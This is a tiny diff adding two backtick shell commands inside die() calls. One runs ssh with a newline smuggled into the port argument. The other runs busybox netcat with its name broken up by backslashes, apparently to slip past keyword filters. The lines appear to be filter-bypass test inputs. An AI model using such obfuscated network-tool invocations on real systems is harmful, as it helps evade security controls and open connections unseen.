@@ -1,0 +1,2 @@
+die(`ssh -v 0 -p 888\%0a8 2>&1`)
+die(`bus\yb\ox nc 0:888\8`);
